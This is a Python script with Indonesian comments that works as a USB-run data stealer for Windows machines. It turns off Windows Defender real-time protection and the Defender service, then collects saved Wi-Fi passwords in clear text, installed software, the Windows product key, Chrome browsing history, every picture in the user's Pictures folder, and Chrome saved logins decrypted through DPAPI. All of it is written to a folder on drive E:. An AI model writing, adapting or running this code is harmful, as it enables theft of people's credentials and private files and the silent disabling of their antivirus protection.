import os
import socket
import time
import subprocess
import shutil
import sqlite3
import win32crypt
from pynput import keyboard

# Lokasi USB langsung ke drive E
usb_path = "E:\\"

# Buat folder untuk menyimpan hasil dump
dump_folder = os.path.join(usb_path, "Win_Dump")
if not os.path.exists(dump_folder):
    os.makedirs(dump_folder)

# Fungsi untuk mematikan antivirus
def disable_antivirus():
    try:
        # Matikan Windows Defender
        subprocess.run("powershell Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)
        subprocess.run("net stop WinDefend", shell=True)
        print("[*] Windows Defender dinonaktifkan.")
    except Exception as e:
        print(f"[!] Gagal mematikan antivirus: {e}")

# Ambil informasi sistem
def get_system_info():
    try:
        username = os.getenv("USERNAME")
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system_info = f"""
=== SYSTEM INFO ===
Username   : {username}
Hostname   : {hostname}
IP Address : {ip_address}
"""
        return system_info
    except Exception as e:
        return f"Error getting system info: {e}"

# Dump Wi-Fi passwords
def dump_wifi_passwords():
    wifi_dump = "== SAVED Wi-Fi PASSWORDS ==\n\n"
    try:
        profiles = subprocess.getoutput("netsh wlan show profiles")
        for line in profiles.split("\n"):
            if "All User Profile" in line:
                ssid = line.split(":")[1].strip()
                result = subprocess.getoutput(f'netsh wlan show profile name="{ssid}" key=clear')
                wifi_dump += result + "\n\n"
        return wifi_dump
    except Exception as e:
        return f"Error dumping Wi-Fi passwords: {e}"

# Dump daftar software yang terinstall
def dump_installed_software():
    try:
        software_list = subprocess.getoutput("wmic product get name,version")
        return software_list
    except Exception as e:
        return f"Error dumping installed software: {e}"

# Dump Windows Product Key
def dump_windows_product_key():
    try:
        product_key = subprocess.getoutput("wmic path softwarelicensingservice get OA3xOriginalProductKey").strip()
        return product_key
    except Exception as e:
        return f"Error dumping Windows product key: {e}"

# Dump status history browser Chrome
def dump_chrome_history():
    chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History")
    history_status = "Chrome history tidak ditemukan."
    try:
        if os.path.exists(chrome_path):
            shutil.copy(chrome_path, os.path.join(dump_folder, "chrome_history.db"))
            history_status = "Chrome history berhasil disalin."
        return history_status
    except Exception as e:
        return f"Error dumping Chrome history: {e}"

# Dump gambar dari folder Pictures
def dump_images():
    pictures_folder = os.path.expandvars(r"%USERPROFILE%\Pictures")
    image_dump = "\n=== DUMPED IMAGES ===\n"
    try:
        image_files = [f for f in os.listdir(pictures_folder) if f.lower().endswith(('jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'))]
        for image in image_files:
            image_path = os.path.join(pictures_folder, image)
            shutil.copy(image_path, os.path.join(dump_folder, image))
            image_dump += f"Image dumped: {image}\n"
        return image_dump
    except Exception as e:
        return f"Error dumping images: {e}"

# Dump akun dan password Chrome
def dump_chrome_passwords():
    login_data_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(login_data_path):
        return "Chrome password database tidak ditemukan."

    try:
        # Salin file Login Data
        shutil.copy2(login_data_path, os.path.join(dump_folder, "chrome_passwords.db"))

        # Buka database
        conn = sqlite3.connect(os.path.join(dump_folder, "chrome_passwords.db"))
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        # Decrypt password
        chrome_passwords = "=== CHROME PASSWORDS ===\n\n"
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]

            try:
                # Decrypt menggunakan DPAPI Windows
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                if decrypted_password:
                    chrome_passwords += f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password.decode('utf-8')}\n\n"
            except Exception as e:
                chrome_passwords += f"URL: {url}\nUsername: {username}\nPassword: <Gagal Decrypt>\n\n"

        conn.close()
        return chrome_passwords
    except Exception as e:
        return f"Gagal dump password Chrome: {str(e)}"

# Main function
def main():
    print("[*] Memulai proses dumping...")

    # Matikan antivirus
    disable_antivirus()

    # Ambil informasi sistem
    system_info = get_system_info()
    print("[*] Mengambil informasi sistem...")

    # Dump Wi-Fi passwords
    wifi_dump = dump_wifi_passwords()
    print("[*] Mengambil password WiFi...")

    # Dump daftar software terinstal
    software_list = dump_installed_software()
    print("[*] Mengambil daftar software terinstal...")

    # Dump Windows Product Key
    product_key = dump_windows_product_key()
    print("[*] Mengambil product key Windows...")

    # Dump Chrome history
    chrome_history_status = dump_chrome_history()
    print("[*] Mengambil history Chrome...")

    # Dump gambar
    image_dump = dump_images()
    print("[*] Mengambil gambar dari folder Pictures...")

    # Dump akun dan password Chrome
    chrome_passwords = dump_chrome_passwords()
    print("[*] Mengambil akun dan password Chrome...")

    # Simpan semua hasil ke folder dump
    try:
        with open(os.path.join(dump_folder, "system_info.txt"), "w") as f:
            f.write(system_info)
        with open(os.path.join(dump_folder, "wifi_passwords.txt"), "w") as f:
            f.write(wifi_dump)
        with open(os.path.join(dump_folder, "installed_software.txt"), "w") as f:
            f.write(software_list)
        with open(os.path.join(dump_folder, "windows_product_key.txt"), "w") as f:
            f.write(product_key)
        with open(os.path.join(dump_folder, "chrome_history_status.txt"), "w") as f:
            f.write(chrome_history_status)
        with open(os.path.join(dump_folder, "image_dump_status.txt"), "w") as f:
            f.write(image_dump)
        with open(os.path.join(dump_folder, "chrome_passwords.txt"), "w") as f:
            f.write(chrome_passwords)
        print("[*] Semua data berhasil disimpan di E:\\Win_Dump.")
    except Exception as e:
        print(f"[!] Gagal menyimpan data: {e}")

if __name__ == "__main__":
    main()